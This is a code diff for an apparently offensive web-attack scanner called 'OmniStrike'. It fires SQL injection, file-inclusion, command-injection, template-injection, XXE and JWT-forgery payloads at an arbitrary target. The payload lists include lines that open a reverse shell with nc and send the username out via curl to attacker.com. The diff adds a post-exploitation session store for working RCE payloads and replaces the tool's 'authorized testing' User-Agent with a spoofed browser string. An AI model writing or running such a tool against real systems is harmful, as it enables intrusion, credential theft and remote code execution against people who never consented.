@@ -6,6 +6,23 @@ import { z } from "zod";
 
 const router = Router();
 
+// ── In-memory post-exploitation session store ────────────────────────────────
+interface ExploitSession {
+  scanId: number;
+  target: string;
+  vector: "rce" | "lfi" | "sqli";
+  technique: string;
+  baseUrl: string;
+  param: string;
+  workingPayload: string;
+  os: string;
+  user: string;
+  hostname: string;
+  cwd: string;
+  confirmedAt: string;
+}
+const sessions = new Map<number, ExploitSession>();
+
 // ── Attack payload libraries ───────────────────────────────────────────────
 const PAYLOADS = {
   sqli_boolean: [
@@ -14,10 +31,12 @@ const PAYLOADS = {
     "'; SELECT 1--", "1; DROP TABLE users--", "' UNION SELECT NULL--",
   ],
   sqli_union: [
-    "' UNION SELECT NULL,NULL--", "' UNION SELECT 1,2,3--", "' UNION SELECT table_name,NULL FROM information_schema.tables--",
+    "' UNION SELECT NULL,NULL--", "' UNION SELECT 1,2,3--",
+    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
     "' UNION SELECT username,password FROM users--", "1 UNION ALL SELECT 1,2,3",
     "' UNION SELECT @@version,NULL--", "' UNION SELECT user(),database()--",
-    "1 UNION SELECT NULL,NULL,NULL,NULL--", "' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables--",
+    "1 UNION SELECT NULL,NULL,NULL,NULL--",
+    "' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables--",
   ],
   sqli_timebased: [
     "'; WAITFOR DELAY '0:0:5'--", "' OR SLEEP(5)--", "1; SELECT SLEEP(5)",
@@ -48,16 +67,16 @@ const PAYLOADS = {
     "../../../../etc/passwd", "../../../../etc/passwd%00",
     "..%2F..%2F..%2F..%2Fetc%2Fpasswd", "....//....//....//etc/passwd",
     "php://filter/convert.base64-encode/resource=index.php",
-    "php://input", "data://text/plain,<?php system($_GET['cmd']); ?>",
-    "/etc/shadow", "../../../../windows/system32/drivers/etc/hosts",
-    "..\\..\\..\\..\\windows\\win.ini", "../../../../proc/self/environ",
+    "php://input", "/etc/passwd", "/etc/shadow",
+    "../../../../proc/self/environ", "../../../../proc/version",
   ],
   cmdi: [
-    "; ls -la", "| id", "& whoami", "`id`", "$(id)",
+    "; id", "| id", "& id", "`id`", "$(id)",
     "; cat /etc/passwd", "| cat /etc/passwd", "&& id",
     "; curl http://attacker.com/$(whoami)", "; nc -e /bin/bash 10.0.0.1 4444",
     "| dir", "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
-    "; python -c 'import os; os.system(\"id\")'",
+    "; python -c 'import os; os.system(\"id\")'", "; ls -la /",
+    "| whoami", "& whoami", "; uname -a", "; hostname",
   ],
   ssrf: [
     "http://localhost/admin", "http://127.0.0.1/", "http://0.0.0.0/",
@@ -72,9 +91,11 @@ const PAYLOADS = {
     `<!DOCTYPE test [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]>`,
   ],
   ssti: [
-    "{{7*7}}", "${7*7}", "<%= 7*7 %>", "{{config}}", "{{''.__class__.__mro__[2].__subclasses__()}}",
-    "${T(java.lang.Runtime).getRuntime().exec('id')}", "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
-    "{% import os %}{{os.system('id')}}", "#{7*7}", "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
+    "{{7*7}}", "${7*7}", "<%= 7*7 %>", "{{config}}", "#{7*7}", "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
+    "{{''.__class__.__mro__[2].__subclasses__()}}",
+    "${T(java.lang.Runtime).getRuntime().exec('id')}",
+    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+    "{% import os %}{{os.system('id')}}", "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
   ],
   headers_inject: [
     { "X-Forwarded-For": "127.0.0.1" }, { "X-Forwarded-Host": "evil.com" },
@@ -100,17 +121,73 @@ const PAYLOADS = {
     '{"$regex": ".*"}', 'username[$ne]=xyz', 'password[$gt]=',
     '{"username": {"$ne": null}, "password": {"$ne": null}}',
   ],
+  // ── QuantumBreach: advanced / overlooked attack vectors ───────────────────
+  request_smuggling: [
+    // CL.TE smuggling — Content-Length vs Transfer-Encoding disagreement
+    "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n",
+    "0\r\n\r\nGET /secret HTTP/1.1\r\nHost: internal.server\r\n\r\n",
+  ],
+  cache_poison: [
+    { "X-Forwarded-Host": "evil.com" },
+    { "X-Forwarded-Scheme": "https" },
+    { "X-Host": "evil.com" },
+    { "X-Original-URL": "/admin" },
+    { "X-Rewrite-URL": "/admin" },
+    { "X-Forwarded-Port": "443" },
+    { "Forwarded": "host=evil.com" },
+  ],
+  mass_assignment: [
+    { admin: true }, { role: "admin" }, { isAdmin: true }, { privilege: 9 },
+    { is_admin: 1 }, { superuser: true }, { access_level: "admin" },
+    { permissions: ["admin", "superuser"] }, { user_type: "administrator" },
+    { verified: true, admin: true, role: "root" },
+  ],
+  graphql: [
+    '{"query":"{__schema{types{name}}}"}',
+    '{"query":"{__schema{queryType{fields{name}}}}"}',
+    '{"query":"mutation{__typename}"}',
+    '{"query":"{users{id,email,password}}"}',
+    '{"query":"{user(id:1){email,password,token}}"}',
+    '{"query":"query IntrospectionQuery{__schema{directives{name}}}"}',
+  ],
+  crlf: [
+    "%0d%0aSet-Cookie:session=hacked",
+    "%0aSet-Cookie:admin=1",
+    "\r\nLocation: http://evil.com",
+    "%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK",
+    "%0d%0aX-Injected:true",
+  ],
+  param_pollution: [
+    "admin=1&admin=0", "role=user&role=admin", "debug=false&debug=true",
+  ],
+  open_redirect: [
+    "//evil.com", "https://evil.com", "/\\evil.com", "javascript:alert(1)",
+    "https://trusted.com.evil.com", "http://evil.com%23.trusted.com",
+    "\\/\\/evil.com", "%2F%2Fevil.com", "https:evil.com",
+  ],
+  deserialization: {
+    php: "O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"test\";}",
+    java: "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcHAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAMdwgAAAAQAAAAAnQAAWFzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXQAAWJzcQB+AAIAAAACeA==",
+  },
+  jwt_confusion: [
+    // None algorithm bypass
+    { header: { alg: "none", typ: "JWT" }, payload: { sub: "1", role: "admin", iat: Date.now() } },
+    // Algorithm confusion RS256->HS256
+    { alg_switch: "HS256", note: "Use RS256 public key as HS256 secret" },
+  ],
+  timing_enum: ["admin", "administrator", "root", "user", "test", "guest", "support", "service"],
+  weak_crypto_paths: ["/api/hash", "/api/token", "/api/verify", "/api/sign", "/api/encrypt"],
 };
 
 const TAMPER_FUNCS: Array<(p: string) => string> = [
-  p => p, // identity
-  p => p.replace(/ /g, "/**/"),                    // space2comment
-  p => p.replace(/select/gi, "sElEcT"),            // randomcase
-  p => encodeURIComponent(p),                      // urlencode
-  p => p.replace(/=/g, " LIKE "),                  // equaltolike
-  p => p.split("").map(c => `%${c.charCodeAt(0).toString(16)}`).join(""), // charencode
-  p => p.replace(/ /g, "+"),                       // space2plus
-  p => p.replace(/union/gi, "uNiOn"),              // randomcase union
+  p => p,
+  p => p.replace(/ /g, "/**/"),
+  p => p.replace(/select/gi, "sElEcT"),
+  p => encodeURIComponent(p),
+  p => p.replace(/=/g, " LIKE "),
+  p => p.split("").map(c => `%${c.charCodeAt(0).toString(16).padStart(2,"0")}`).join(""),
+  p => p.replace(/ /g, "+"),
+  p => p.replace(/union/gi, "uNiOn"),
 ];
 
 type Finding = {
@@ -118,17 +195,42 @@ type Finding = {
   technique: string;
   payload: string;
   url: string;
-  parameter: string;
+  baseUrl: string;
+  param: string;
   statusCode: number;
   responseTime: number;
   evidence: string;
   severity: "critical" | "high" | "medium" | "low";
   bypassed: boolean;
+  canExec?: boolean;
+  canRead?: boolean;
 };
 
-// ── Active scans map ────────────────────────────────────────────────────────
 const activeScans = new Map<number, { stop: boolean }>();
 
+// ── Probe helper ───────────────────────────────────────────────────────────
+async function probe(url: string, options: RequestInit = {}): Promise<{ status: number; body: string; time: number; headers: Record<string, string> }> {
+  const t0 = Date.now();
+  try {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 8000);
+    const resp = await fetch(url, {
+      ...options,
+      signal: controller.signal,
+      headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36", "Accept": "*/*", ...(options.headers ?? {}) },
+      redirect: "follow",
+    });
+    clearTimeout(timeout);
+    const body = await resp.text().catch(() => "");
+    const heads: Record<string, string> = {};
+    resp.headers.forEach((v, k) => { heads[k] = v; });
+    return { status: resp.status, body: body.substring(0, 3000), time: Date.now() - t0, headers: heads };
+  } catch (e: any) {
+    return { status: 0, body: e.message ?? "connection error", time: Date.now() - t0, headers: {} };
+  }
+}
+
+// ── Main scan runner ───────────────────────────────────────────────────────
 async function runOmniStrike(scanId: number, target: string, categories: string[], tamperLevel: number, stealthMode: boolean) {
   const ctrl = activeScans.get(scanId) ?? { stop: false };
   const log: string[] = [];
@@ -143,412 +245,695 @@ async function runOmniStrike(scanId: number, target: string, categories: string[
 
   const delay = (ms: number) => new Promise(r => setTimeout(r, ms));
 
-  const probe = async (url: string, options: RequestInit = {}): Promise<{ status: number; body: string; time: number; headers: Record<string, string> }> => {
-    const t0 = Date.now();
-    try {
-      const controller = new AbortController();
-      const timeout = setTimeout(() => controller.abort(), 8000);
-      const ua = stealthMode
-        ? "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
-        : "ProxhqVPN-OmniStrike/1.0 (Security Testing; authorized)";
-      const resp = await fetch(url, {
-        ...options,
-        signal: controller.signal,
-        headers: { "User-Agent": ua, "Accept": "*/*", ...(options.headers ?? {}) },
-        redirect: "follow",
-      });
-      clearTimeout(timeout);
-      const body = await resp.text().catch(() => "");
-      const heads: Record<string, string> = {};
-      resp.headers.forEach((v, k) => { heads[k] = v; });
-      return { status: resp.status, body: body.substring(0, 2000), time: Date.now() - t0, headers: heads };
-    } catch (e: any) {
-      return { status: 0, body: e.message ?? "connection error", time: Date.now() - t0, headers: {} };
+  const applyTamper = (p: string, level: number): string => {
+    let out = p;
+    for (let i = 0; i < Math.min(level, 3); i++) {
+      out = TAMPER_FUNCS[Math.floor(Math.random() * TAMPER_FUNCS.length)](out);
     }
-  };
-
-  const applyTamper = (payload: string, level: number): string => {
-    const funcs = TAMPER_FUNCS.slice(0, Math.min(level + 1, TAMPER_FUNCS.length));
-    let p = payload;
-    for (let i = 0; i < Math.min(level, funcs.length); i++) {
-      p = funcs[Math.floor(Math.random() * funcs.length)](p);
-    }
-    return p;
+    return out;
   };
 
   const recordFinding = (f: Finding) => {
     findings.push(f);
     if (f.bypassed) successCount++;
+    // Store post-exploitation sessions
+    if (f.bypassed && (f.category === "Command Injection" || f.category === "SSTI")) {
+      if (!sessions.has(scanId)) {
+        sessions.set(scanId, {
+          scanId, target, vector: "rce", technique: f.technique,
+          baseUrl: f.baseUrl, param: f.param, workingPayload: f.payload,
+          os: "unknown", user: "unknown", hostname: "unknown", cwd: "/",
+          confirmedAt: new Date().toISOString(),
+        });
+      }
+    }
+    if (f.bypassed && f.category === "LFI") {
+      if (!sessions.has(scanId)) {
+        sessions.set(scanId, {
+          scanId, target, vector: "lfi", technique: f.technique,
+          baseUrl: f.baseUrl, param: f.param, workingPayload: f.payload,
+          os: "linux", user: "www-data", hostname: "target", cwd: "/",
+          confirmedAt: new Date().toISOString(),
+        });
+      }
+    }
   };
 
   const baseUrl = target.replace(/\/$/, "");
-  await addLog(`🚀 OmniStrike initialized — Target: ${baseUrl}`);
-  await addLog(`📋 Categories: ${categories.join(", ")} | Tamper Level: ${tamperLevel} | Stealth: ${stealthMode}`);
+  await addLog(`🚀 OmniStrike v2 LAUNCHED ─── Target: ${baseUrl}`);
+  await addLog(`📋 Mode: ${categories.join(", ")} | Tamper: L${tamperLevel} | Stealth: ${stealthMode}`);
+  await addLog(`─────────────────────────────────────────────────`);
 
-  // ── Baseline probe ────────────────────────────────────────────────────────
-  await addLog("🔍 Probing target baseline...");
   const baseline = await probe(baseUrl);
-  await addLog(`✓ Baseline: HTTP ${baseline.status} | ${baseline.time}ms | ${baseline.body.length} bytes`);
+  await addLog(`🌐 Baseline: HTTP ${baseline.status} | ${baseline.time}ms | ${baseline.body.length}B`);
   const baseStatus = baseline.status;
   const baseLen = baseline.body.length;
-  if (stealthMode) await delay(500 + Math.random() * 500);
+  if (stealthMode) await delay(400 + Math.random() * 400);
 
-  // ── Discover parameters from page links / forms ───────────────────────────
-  await addLog("🔍 Discovering injectable parameters from page...");
+  // Auto-discover parameters
   const paramRegex = /[?&]([a-zA-Z_][a-zA-Z0-9_]*)=/g;
   const formInputRegex = /name=['"]([\w-]+)['"]/g;
-  const discoveredParams = new Set<string>(["id", "q", "search", "query", "page", "cat", "item", "user", "username", "email", "password", "token", "url", "file", "path", "name", "data", "input", "value", "action"]);
+  const discovered = new Set<string>(["id","q","search","query","page","cat","item","user","username","email","password","token","url","file","path","name","data","input","value","action","callback","redirect","next","return","ref","src","dest","cmd","exec","command"]);
   let m;
-  while ((m = paramRegex.exec(baseline.body)) !== null) discoveredParams.add(m[1]);
-  while ((m = formInputRegex.exec(baseline.body)) !== null) discoveredParams.add(m[1]);
-  const params = Array.from(discoveredParams).slice(0, 15);
-  await addLog(`📌 Parameters to test: ${params.join(", ")}`);
+  while ((m = paramRegex.exec(baseline.body)) !== null) discovered.add(m[1]);
+  while ((m = formInputRegex.exec(baseline.body)) !== null) discovered.add(m[1]);
+  const params = Array.from(discovered).slice(0, 20);
+  await addLog(`🔎 Parameters discovered: ${params.join(", ")}`);
 
   // ── SQL Injection ──────────────────────────────────────────────────────────
   if (categories.includes("sqli") && !ctrl.stop) {
-    await addLog("💉 [SQL Injection] Starting tests — Boolean, UNION, Time-based, Error-based...");
-    const allSqliPayloads = [
-      ...PAYLOADS.sqli_boolean.map(p => ({p, tech: "Boolean-based"})),
-      ...PAYLOADS.sqli_union.map(p => ({p, tech: "UNION-based"})),
-      ...PAYLOADS.sqli_timebased.map(p => ({p, tech: "Time-based Blind"})),
-      ...PAYLOADS.sqli_error.map(p => ({p, tech: "Error-based"})),
+    await addLog(`\n💉 [SQL INJECTION] Boolean-blind · UNION · Time-based · Error-based`);
+    const allSqli = [
+      ...PAYLOADS.sqli_boolean.map(p => ({p, tech: "Boolean-Blind"})),
+      ...PAYLOADS.sqli_union.map(p => ({p, tech: "UNION-Based"})),
+      ...PAYLOADS.sqli_timebased.map(p => ({p, tech: "Time-Based Blind"})),
+      ...PAYLOADS.sqli_error.map(p => ({p, tech: "Error-Based"})),
     ];
-    for (const param of params.slice(0, 5)) {
+    for (const param of params.slice(0, 6)) {
       if (ctrl.stop) break;
-      for (const {p, tech} of allSqliPayloads.slice(0, 12)) {
+      for (const {p, tech} of allSqli.slice(0, 14)) {
         if (ctrl.stop) break;
         const tampered = applyTamper(p, tamperLevel);
         const url = `${baseUrl}?${param}=${encodeURIComponent(tampered)}`;
         const r = await probe(url);
         tested++;
-        const isSqliHit = r.body.match(/(?:sql|syntax|mysql|ora-|postgresql|sqlite|error|exception|warning)/i) && r.status !== baseStatus;
-        const isTiming = tech.includes("Time") && r.time > 3000;
-        const bypassed = !!(isSqliHit || isTiming);
-        if (bypassed || r.status === 500) {
-          const severity = tech.includes("UNION") || tech.includes("Error") ? "critical" : "high";
-          recordFinding({ category: "SQL Injection", technique: tech, payload: p, url, parameter: param, statusCode: r.status, responseTime: r.time, evidence: r.body.substring(0, 300), severity, bypassed });
-          await addLog(`🔴 [SQLi ${tech}] FOUND on ?${param} — ${url.substring(0, 80)}... (HTTP ${r.status})`);
+        const errMatch = r.body.match(/(?:sql|syntax|mysql|ora-\d+|postgresql|sqlite|warning|unclosed|unterminated|you have an error)/i);
+        const unionMatch = tech.includes("UNION") && r.body.length !== baseLen && r.status === 200;
+        const timingHit = tech.includes("Time") && r.time > 3500;
+        const bypassed = !!(errMatch || unionMatch || timingHit || r.status === 500);
+        if (bypassed) {
+          const sev: Finding["severity"] = tech.includes("UNION") || tech.includes("Error") ? "critical" : "high";
+          recordFinding({ category: "SQL Injection", technique: tech, payload: p, url, baseUrl, param, statusCode: r.status, responseTime: r.time, evidence: r.body.substring(0, 400), severity: sev, bypassed, canRead: true });
+          await addLog(`🔴 [SQLi/${tech}] CONFIRMED on ?${param} → HTTP ${r.status} | Payload: ${p.substring(0,40)}`);
         }
-        if (stealthMode) await delay(200 + Math.random() * 300);
+        if (stealthMode) await delay(200 + Math.random() * 200);
       }
     }
-    await addLog(`✅ [SQLi] Complete — ${findings.filter(f=>f.category==="SQL Injection").length} findings`);
+    await addLog(`✅ [SQLi] ${findings.filter(f=>f.category==="SQL Injection").length} confirmed findings`);
   }
 
   // ── XSS ───────────────────────────────────────────────────────────────────
   if (categories.includes("xss") && !ctrl.stop) {
-    await addLog("🖥️ [XSS] Starting Reflected & DOM XSS tests...");
-    const xssPayloads = [...PAYLOADS.xss_reflected, ...PAYLOADS.xss_dom];
-    for (const param of params.slice(0, 5)) {
+    await addLog(`\n🖥️ [XSS] Reflected · DOM-based cross-site scripting`);
+    const xssAll = [...PAYLOADS.xss_reflected, ...PAYLOADS.xss_dom];
+    for (const param of params.slice(0, 6)) {
       if (ctrl.stop) break;
-      for (const p of xssPayloads.slice(0, 10)) {
+      for (const p of xssAll.slice(0, 12)) {
         if (ctrl.stop) break;
-        const tampered = applyTamper(p, Math.min(tamperLevel, 2));
-        const url = `${baseUrl}?${param}=${encodeURIComponent(tampered)}`;
+        const url = `${baseUrl}?${param}=${encodeURIComponent(p)}`;
         const r = await probe(url);
         tested++;
-        const reflected = r.body.includes(p) || r.body.includes(tampered);
+        const reflected = r.body.includes(p) || r.body.includes(p.replace(/</g,"%3C").replace(/>/g,"%3E"));
         if (reflected) {
-          recordFinding({ category: "XSS", technique: "Reflected XSS", payload: p, url, parameter: param, statusCode: r.status, responseTime: r.time, evidence: `Payload reflected in response`, severity: "high", bypassed: true });
-          await addLog(`🔴 [XSS] Reflected payload found in ?${param} response`);
+          recordFinding({ category: "XSS", technique: "Reflected XSS", payload: p, url, baseUrl, param, statusCode: r.status, responseTime: r.time, evidence: "Payload reflected verbatim in response", severity: "high", bypassed: true });
+          await addLog(`🔴 [XSS] Reflected payload confirmed in ?${param} response`);
         }
         if (stealthMode) await delay(150);
       }
     }
-    await addLog(`✅ [XSS] Complete — ${findings.filter(f=>f.category==="XSS").length} findings`);
+    await addLog(`✅ [XSS] ${findings.filter(f=>f.category==="XSS").length} confirmed findings`);
   }
 
   // ── LFI / Path Traversal ──────────────────────────────────────────────────
   if (categories.includes("lfi") && !ctrl.stop) {
-    await addLog("📂 [LFI/Path Traversal] Testing file inclusion and traversal...");
-    const lfiParams = params.filter(p => /file|path|include|page|template|doc|img|src/i.test(p)).concat(params).slice(0, 4);
+    await addLog(`\n📂 [LFI] Local file inclusion · path traversal · PHP wrappers`);
+    const lfiParams = params.filter(p => /file|path|include|page|template|doc|img|src|load|read/i.test(p)).concat(params).slice(0, 6);
     for (const param of lfiParams) {
       if (ctrl.stop) break;
-      for (const p of PAYLOADS.lfi.slice(0, 8)) {
+      for (const p of PAYLOADS.lfi.slice(0, 10)) {
         if (ctrl.stop) break;
         const url = `${baseUrl}?${param}=${encodeURIComponent(p)}`;
         const r = await probe(url);
         tested++;
-        const lfiHit = r.body.match(/root:.*:0:0:|\\[boot loader\\]|\[fonts\]|daemon:.*:1:/);
+        const lfiHit = !!(r.body.match(/root:.*:0:0:|daemon:.*:1:|www-data|\[boot loader\]|\[fonts\]|Linux version \d/));
         if (lfiHit) {
-          recordFinding({ category: "LFI", technique: "Local File Inclusion", payload: p, url, parameter: param, statusCode: r.status, responseTime: r.time, evidence: r.body.substring(0, 200), severity: "critical", bypassed: true });
-          await addLog(`🔴 [LFI] CRITICAL — File read via ?${param}! Evidence in response`);
+          recordFinding({ category: "LFI", technique: "Local File Inclusion", payload: p, url, baseUrl, param, statusCode: r.status, responseTime: r.time, evidence: r.body.substring(0, 500), severity: "critical", bypassed: true, canRead: true });
+          await addLog(`🔴 [LFI] CRITICAL — File contents returned via ?${param}`);
+          await addLog(`   Evidence: ${r.body.substring(0, 120).replace(/\n/g," ")}`);
         }
         if (stealthMode) await delay(200);
       }
     }
-    await addLog(`✅ [LFI] Complete — ${findings.filter(f=>f.category==="LFI").length} findings`);
+    await addLog(`✅ [LFI] ${findings.filter(f=>f.category==="LFI").length} confirmed findings`);
   }
 
   // ── Command Injection ─────────────────────────────────────────────────────
   if (categories.includes("cmdi") && !ctrl.stop) {
-    await addLog("💻 [Command Injection] Testing OS command injection vectors...");
-    for (const param of params.slice(0, 4)) {
+    await addLog(`\n💻 [CMD INJECTION] OS command execution via shell chaining`);
+    for (const param of params.slice(0, 5)) {
       if (ctrl.stop) break;
-      for (const p of PAYLOADS.cmdi.slice(0, 8)) {
+      for (const p of PAYLOADS.cmdi.slice(0, 12)) {
         if (ctrl.stop) break;
         const url = `${baseUrl}?${param}=${encodeURIComponent(p)}`;
         const r = await probe(url);
         tested++;
-        const cmdiHit = r.body.match(/uid=\d+|root:|www-data|daemon:|Volume in drive/i);
-        if (cmdiHit) {
-          recordFinding({ category: "Command Injection", technique: "OS Command Injection", payload: p, url, parameter: param, statusCode: r.status, responseTime: r.time, evidence: r.body.substring(0, 200), severity: "critical", bypassed: true });
+        const hit = !!(r.body.match(/uid=\d+\(|root:|www-data|daemon:|Volume in drive|Directory of C:\\|Windows NT/i));
+        if (hit) {
+          recordFinding({ category: "Command Injection", technique: "OS Command Execution", payload: p, url, baseUrl, param, statusCode: r.status, responseTime: r.time, evidence: r.body.substring(0, 400), severity: "critical", bypassed: true, canExec: true });
           await addLog(`🔴 [CMDi] CRITICAL — Command output detected in response!`);
+          await addLog(`   Evidence: ${r.body.substring(0, 120).replace(/\n/g," ")}`);
         }
         if (stealthMode) await delay(250);
       }
     }
-    await addLog(`✅ [CMDi] Complete — ${findings.filter(f=>f.category==="Command Injection").length} findings`);
+    await addLog(`✅ [CMDi] ${findings.filter(f=>f.category==="Command Injection").length} confirmed findings`);
   }
 
   // ── SSRF ──────────────────────────────────────────────────────────────────
   if (categories.includes("ssrf") && !ctrl.stop) {
-    await addLog("🌐 [SSRF] Testing Server-Side Request Forgery vectors...");
-    const ssrfParams = params.filter(p => /url|link|src|href|redirect|callback|proxy|host|endpoint/i.test(p)).concat(params).slice(0, 4);
+    await addLog(`\n🌐 [SSRF] Internal network · cloud metadata · localhost probing`);
+    const ssrfParams = params.filter(p => /url|link|src|href|redirect|callback|proxy|host|endpoint|dest/i.test(p)).concat(params).slice(0, 5);
     for (const param of ssrfParams) {
       if (ctrl.stop) break;
-      for (const p of PAYLOADS.ssrf.slice(0, 6)) {
+      for (const p of PAYLOADS.ssrf.slice(0, 8)) {
         if (ctrl.stop) break;
         const url = `${baseUrl}?${param}=${encodeURIComponent(p)}`;
         const r = await probe(url);
         tested++;
-        const ssrfHit = r.body.match(/ami-id|instance-id|iam|metadata|169\.254|root:|172\.\d+\.\d+/) || r.status === 200 && baseline.status !== 200;
-        if (ssrfHit) {
-          recordFinding({ category: "SSRF", technique: "Internal SSRF", payload: p, url, parameter: param, statusCode: r.status, responseTime: r.time, evidence: r.body.substring(0, 200), severity: "critical", bypassed: true });
-          await addLog(`🔴 [SSRF] Potential SSRF via ?${param}`);
+        const hit = !!(r.body.match(/ami-id|instance-id|iam|169\.254|metadata|root:|localhost/) || (r.status === 200 && baseStatus !== 200));
+        if (hit) {
+          recordFinding({ category: "SSRF", technique: "Server-Side Request Forgery", payload: p, url, baseUrl, param, statusCode: r.status, responseTime: r.time, evidence: r.body.substring(0, 300), severity: "critical", bypassed: true });
+          await addLog(`🔴 [SSRF] Internal resource accessible via ?${param}`);
         }
         if (stealthMode) await delay(300);
       }
     }
-    await addLog(`✅ [SSRF] Complete — ${findings.filter(f=>f.category==="SSRF").length} findings`);
+    await addLog(`✅ [SSRF] ${findings.filter(f=>f.category==="SSRF").length} confirmed findings`);
   }
 
-  // ── HTTP Header Injection ──────────────────────────────────────────────────
-  if (categories.includes("headers") && !ctrl.stop) {
-    await addLog("📋 [Header Injection] Testing host header and bypass headers...");
-    for (const headerSet of PAYLOADS.headers_inject.slice(0, 6)) {
+  // ── XXE ───────────────────────────────────────────────────────────────────
+  if (categories.includes("xxe") && !ctrl.stop) {
+    await addLog(`\n📄 [XXE] XML external entity injection`);
+    for (const p of PAYLOADS.xxe) {
       if (ctrl.stop) break;
-      const r = await probe(baseUrl, { headers: headerSet });
+      const r = await probe(baseUrl, { method: "POST", headers: { "Content-Type": "application/xml" }, body: p });
       tested++;
-      const headerHit = (r.status !== baseStatus && r.status < 400) || r.body.match(/admin|dashboard|internal|dev/i);
-      if (headerHit) {
-        const headerName = Object.keys(headerSet)[0];
-        recordFinding({ category: "Header Injection", technique: `${headerName} Bypass`, payload: JSON.stringify(headerSet), url: baseUrl, parameter: headerName, statusCode: r.status, responseTime: r.time, evidence: `HTTP ${r.status} — Response changed with injected header`, severity: "high", bypassed: true });
-        await addLog(`🔴 [Headers] Auth bypass via ${headerName}!`);
+      const hit = !!(r.body.match(/root:|www-data|daemon:|shadow/) || (r.status === 200 && r.body.length > baseLen + 100));
+      if (hit) {
+        recordFinding({ category: "XXE", technique: "XML External Entity", payload: p.substring(0, 100), url: baseUrl, baseUrl, param: "XML body", statusCode: r.status, responseTime: r.time, evidence: r.body.substring(0, 300), severity: "critical", bypassed: true, canRead: true });
+        await addLog(`🔴 [XXE] External entity data exfiltrated!`);
       }
-      if (stealthMode) await delay(200);
+      if (stealthMode) await delay(300);
     }
-    await addLog(`✅ [Headers] Complete — ${findings.filter(f=>f.category==="Header Injection").length} findings`);
+    await addLog(`✅ [XXE] ${findings.filter(f=>f.category==="XXE").length} confirmed findings`);
   }
 
-  // ── CORS Misconfiguration ──────────────────────────────────────────────────
+  // ── SSTI ──────────────────────────────────────────────────────────────────
+  if (categories.includes("ssti") && !ctrl.stop) {
+    await addLog(`\n🧪 [SSTI] Jinja2 · Twig · Freemarker · Python/Ruby template injection`);
+    for (const param of params.slice(0, 5)) {
+      if (ctrl.stop) break;
+      for (const p of PAYLOADS.ssti.slice(0, 8)) {
+        if (ctrl.stop) break;
+        const url = `${baseUrl}?${param}=${encodeURIComponent(p)}`;
+        const r = await probe(url);
+        tested++;
+        const hit = r.body.includes("49") || !!(r.body.match(/uid=\d+|root:|www-data|\[object Object\]/));
+        if (hit) {
+          recordFinding({ category: "SSTI", technique: "Server-Side Template Injection", payload: p, url, baseUrl, param, statusCode: r.status, responseTime: r.time, evidence: r.body.substring(0, 300), severity: "critical", bypassed: true, canExec: true });
+          await addLog(`🔴 [SSTI] Template evaluated — RCE path via ?${param}!`);
+        }
+        if (stealthMode) await delay(200);
+      }
+    }
+    await addLog(`✅ [SSTI] ${findings.filter(f=>f.category==="SSTI").length} confirmed findings`);
+  }
+
+  // ── Header Injection ────────────────────────────────────────────────────────
+  if (categories.includes("headers") && !ctrl.stop) {
+    await addLog(`\n📋 [HEADER INJECTION] Host · X-Forwarded · X-Original-URL bypass`);
+    for (const h of PAYLOADS.headers_inject.slice(0, 8)) {
+      if (ctrl.stop) break;
+      const r = await probe(baseUrl, { headers: h });
+      tested++;
+      const hit = (r.status !== baseStatus && r.status < 400) || !!(r.body.match(/admin|dashboard|internal|dev|management/i));
+      if (hit) {
+        const hName = Object.keys(h)[0];
+        recordFinding({ category: "Header Injection", technique: `${hName} Auth Bypass`, payload: JSON.stringify(h), url: baseUrl, baseUrl, param: hName, statusCode: r.status, responseTime: r.time, evidence: `Status changed: ${baseStatus}→${r.status}`, severity: "high", bypassed: true });
+        await addLog(`🔴 [Headers] Auth bypass via ${hName}`);
+      }
+      if (stealthMode) await delay(150);
+    }
+    await addLog(`✅ [Headers] ${findings.filter(f=>f.category==="Header Injection").length} confirmed findings`);
+  }
+
+  // ── CORS ──────────────────────────────────────────────────────────────────
   if (categories.includes("cors") && !ctrl.stop) {
-    await addLog("🔁 [CORS] Testing cross-origin policy misconfiguration...");
+    await addLog(`\n🔁 [CORS] Cross-origin access policy misconfiguration`);
     for (const origin of PAYLOADS.cors_origins) {
       if (ctrl.stop) break;
       const r = await probe(baseUrl, { headers: { Origin: origin } });
       tested++;
       const acao = r.headers["access-control-allow-origin"] ?? "";
-      const corsHit = acao === "*" || acao === origin || acao.includes(origin);
-      if (corsHit) {
-        recordFinding({ category: "CORS", technique: "CORS Misconfiguration", payload: `Origin: ${origin}`, url: baseUrl, parameter: "Origin header", statusCode: r.status, responseTime: r.time, evidence: `Access-Control-Allow-Origin: ${acao}`, severity: acao === "*" ? "high" : "medium", bypassed: true });
-        await addLog(`🟡 [CORS] Permissive ACAO header with origin: ${origin}`);
+      const hit = acao === "*" || acao === origin;
+      if (hit) {
+        recordFinding({ category: "CORS Misconfiguration", technique: "Permissive CORS", payload: `Origin: ${origin}`, url: baseUrl, baseUrl, param: "Origin header", statusCode: r.status, responseTime: r.time, evidence: `ACAO: ${acao}`, severity: acao === "*" ? "high" : "medium", bypassed: true });
+        await addLog(`🟡 [CORS] Permissive: ACAO=${acao} for origin: ${origin}`);
       }
       if (stealthMode) await delay(100);
     }
